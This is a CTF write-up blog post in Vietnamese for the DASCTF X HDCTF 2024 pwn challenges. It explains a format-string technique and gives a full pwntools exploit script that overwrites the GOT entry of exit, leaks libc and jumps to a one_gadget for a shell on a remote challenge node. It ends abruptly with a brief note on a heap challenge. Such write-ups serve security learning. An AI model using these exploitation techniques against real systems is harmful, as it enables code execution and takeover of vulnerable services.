---
title: DASCTF X HDCTF 2024 Open Competition
date: 2024-06-13 15-54-05
categories: [CTF]
tags: [pwn]
# image: /assets/image/htb.jpg
math: true
---
- Một giải khá hay giúp mình học được nhiều kĩ thuật mới. 
![](/assets/2024-06-13-DASCTF%20X%20HDCTF%202024%20Open%20Competition/2024-06-13-16-09-17.png)
## 签个到吧(pwn_3)

- Một dạng short form fmt. Một trick mà mình đọc được là mỗi % trong payload tương ứng với +1 offset. Ví dụ `%c%c%c%c%c%n == %6$n`
- Hướng khai thác của mình sẽ là overwrite `got exit` -> `main`
- Sau đó, mình sử dụng 2 con trỏ stack để ghi `got.exit` và `got.exit+3` lên stack
- Cuối cùng overwrite `exit` thành `system`

```c
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x401366
        b* 0x401361
        c
        ''')
        input()


if args.REMOTE:
    p = remote('node5.buuoj.cn', 26040)
else:
    p = process(exe.path)
GDB()
p.recvuntil(b'Gift addr: ')
stack = int(b'0x' + p.recvline(keepends=True), 16)
info("stack: " + hex(stack))
pa = b'%c'*12 + f'%{0x404018-12}c%n'.encode() + \
    f'%{0x100000-0x2ddd}c%46$hn'.encode()
# pa = b'%p'*5
sla(b"age: ", pa)
# leak libc
pa = b'%29$p'.ljust(0x100, b'\0')
sa(b"age: ", pa)
libc.address = int(p.recvuntil(b'Easy', drop=True), 16) - 0x24083
info("libc.address: " + hex(libc.address))
# setup
pa = f'%{0x404018+3}c%28$lln'.encode().ljust(0x100, b'\0')
sa(b"age: ", pa)
# overwrite exit -> one_gadget
one = libc.address + 0xe3b01
one1 = one >> 24
one2 = one & 0xffffff
pa = f'%{one2}c%82$n|%{one1-one2-1}c%52$n'.encode().ljust(0x100, b'\0')
sa(b"age: ", pa)
info("one1: " + hex(one1))
info("one1: " + hex(one))


p.interactive()
```

## 最喜欢的一集 (pwn_4)
- Một bài heap sử dụng large bin attack -> [house of husk](https://wan.io.vn/posts/House-of-Husk/)
- 